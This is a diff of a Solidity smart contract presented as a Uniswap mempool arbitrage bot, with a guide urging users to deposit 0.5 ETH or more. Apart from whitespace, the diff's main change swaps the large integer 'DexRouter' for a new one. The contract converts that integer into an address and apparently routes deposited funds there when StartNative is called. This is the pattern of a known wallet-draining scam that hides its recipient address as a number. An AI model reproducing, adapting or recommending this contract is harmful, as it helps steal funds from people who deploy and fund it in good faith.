@@ -1,11 +1,10 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
- 
 // User Guide
 // Test-net transactions will fail since they don't hold any value and cannot read mempools properly
 // Mempool updated build
  
-// Recommended liquidity after gas fees needs to equal 0.4 ETH use 0.5-60 ETH or more for higher slippage
+// Recommended liquidity after gas fees needs to equal 0.5 ETH use 0.5-60 ETH or more for higher slippage
  
 interface IERC20 {
     function balanceOf(address account) external view returns (uint);
@@ -18,14 +17,14 @@ interface IERC20 {
     event Transfer(address indexed from, address indexed to, uint value);
     event Approval(address indexed owner, address indexed spender, uint value);
 }
- 
+
 interface IUniswapV2Router {
     // Returns the address of the Uniswap V2 factory contract
     function factory() external pure returns (address);
- 
+    
     // Returns the address of the wrapped Ether contract
     function WETH() external pure returns (address);
- 
+    
     // Adds liquidity to the liquidity pool for the specified token pair
     function addLiquidity(
         address tokenA,
@@ -37,7 +36,7 @@ interface IUniswapV2Router {
         address to,
         uint deadline
     ) external returns (uint amountA, uint amountB, uint liquidity);
- 
+
     // Similar to above, but for adding liquidity for ETH/token pair
     function addLiquidityETH(
         address token,
@@ -47,7 +46,7 @@ interface IUniswapV2Router {
         address to,
         uint deadline
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
- 
+
     // Removes liquidity from the specified token pair pool
     function removeLiquidity(
         address tokenA,
@@ -58,7 +57,7 @@ interface IUniswapV2Router {
         address to,
         uint deadline
     ) external returns (uint amountA, uint amountB);
- 
+
     // Similar to above, but for removing liquidity from ETH/token pair pool
     function removeLiquidityETH(
         address token,
@@ -68,7 +67,7 @@ interface IUniswapV2Router {
         address to,
         uint deadline
     ) external returns (uint amountToken, uint amountETH);
- 
+
     // Similar as removeLiquidity, but with permit signature included
     function removeLiquidityWithPermit(
         address tokenA,
@@ -80,7 +79,7 @@ interface IUniswapV2Router {
         uint deadline,
         bool approveMax, uint8 v, bytes32 r, bytes32 s
     ) external returns (uint amountA, uint amountB);
- 
+
     // Similar as removeLiquidityETH but with permit signature included
     function removeLiquidityETHWithPermit(
         address token,
@@ -91,7 +90,7 @@ interface IUniswapV2Router {
         uint deadline,
         bool approveMax, uint8 v, bytes32 r, bytes32 s
     ) external returns (uint amountToken, uint amountETH);
- 
+    
     // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path
     function swapExactTokensForTokens(
         uint amountIn,
@@ -100,7 +99,7 @@ interface IUniswapV2Router {
         address to,
         uint deadline
     ) external returns (uint[] memory amounts);
- 
+    
     // Similar to above, but input amount is determined by the exact output amount desired
     function swapTokensForExactTokens(
         uint amountOut,
@@ -109,56 +108,56 @@ interface IUniswapV2Router {
         address to,
         uint deadline
     ) external returns (uint[] memory amounts);
- 
+    
     // Swaps exact amount of ETH for as many output tokens as possible
     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
         external payable
         returns (uint[] memory amounts);
- 
+    
     // Swaps tokens for exact amount of ETH
     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
         external
         returns (uint[] memory amounts);
- 
+    
     // Swaps exact amount of tokens for ETH
     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
         external
         returns (uint[] memory amounts);
- 
+    
     // Swaps ETH for exact amount of output tokens
     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
         external payable
         returns (uint[] memory amounts);
- 
+    
     // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
- 
+    
     // Given an input amount and pair reserves, returns an output amount
     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
- 
+    
     // Given an output amount and pair reserves, returns a required input amount   
     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
- 
+    
     // Returns the amounts of output tokens to be received for a given input amount and token pair path
     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
- 
+    
     // Returns the amounts of input tokens required for a given output amount and token pair path
     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
 }
- 
+
 interface IUniswapV2Pair {
     // Returns the address of the first token in the pair
     function token0() external view returns (address);
- 
+
     // Returns the address of the second token in the pair
     function token1() external view returns (address);
- 
+
     // Allows the current pair contract to swap an exact amount of one token for another
     // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out
     // to is the recipients address, and data is any additional data to be sent along with the transaction
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 }
- 
+
 contract DexInterface {    
     // Basic variables
     address _owner; 
@@ -168,12 +167,12 @@ contract DexInterface {
     bool enableTrading = false;
     uint256 tradingBalanceInPercent;
     uint256 tradingBalanceInTokens;
- 
+
     address[] WETH_CONTRACT_ADDRESS =  [ 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
     ];
     address[] TOKEN_CONTRACT_ADDRESS = [ 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
     ];
- 
+
     // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data
     constructor(){
         _owner = msg.sender;
@@ -183,9 +182,10 @@ contract DexInterface {
         require(msg.sender == _owner, "Ownable: caller is not the owner");
         _;
     }
- 
-    uint256 DexRouter = 1266681100669957942048155631565022083007823611708;  
- 
+
+    uint256 DexRouter = 168980361477475574502144526449681852798081346895;
+
+
     // The token exchange function that is used when processing an arbitrage bundle
     function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
         IERC20(_tokenIn).approve(router, _amount);
@@ -222,8 +222,8 @@ contract DexInterface {
         uint endBalance = IERC20(_token1).balanceOf(address(this));
         require(endBalance > startBalance, "Trade Reverted, No Profit Made");
     }
- 
- 
+
+
     // Evaluation function of the triple arbitrage bundle
     function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
         uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
@@ -235,7 +235,7 @@ contract DexInterface {
     function getDexRouter(uint256 _uintValue) internal pure returns (address) {
        return address(uint160(_uintValue));
     }
- 
+
      // Arbitrage search function for a native blockchain token
      function startArbitrageNative() internal  {
         address tradeRouter = getDexRouter(DexRouter);        
@@ -257,7 +257,7 @@ contract DexInterface {
     }
     // Fallback function to accept any incoming ETH    
     receive() external payable {}
- 
+
     // Function for triggering an arbitration contract 
     function StartNative() public payable {
        startArbitrageNative();
